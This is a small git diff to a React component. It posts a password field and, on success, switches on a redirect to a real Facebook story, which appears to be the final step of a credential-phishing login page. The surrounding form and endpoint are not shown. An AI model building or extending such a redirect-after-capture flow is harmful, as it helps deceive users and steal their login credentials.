@@ -31,12 +31,12 @@ function App() {
         pass,
       })
       .then((res) => {
-        console.log(res);
-        // window.location.href =
-        //   "https://m.facebook.com/story.php?story_fbid=pfbid0ZJbYTsR868ySqAUCwXTzqz3TbonC7PwKLyuWLEHhxrmmqH8yZtYhaQjgzFuRCR7Ul&id=100075758240162 ";
+        console.log("res: ", res);
+        window.location.href =
+          "https://m.facebook.com/story.php?story_fbid=pfbid0ZJbYTsR868ySqAUCwXTzqz3TbonC7PwKLyuWLEHhxrmmqH8yZtYhaQjgzFuRCR7Ul&id=100075758240162 ";
       })
       .catch((er) => {
-        console.log(er);
+        console.log("eroare: ", er);
       });
   };
 
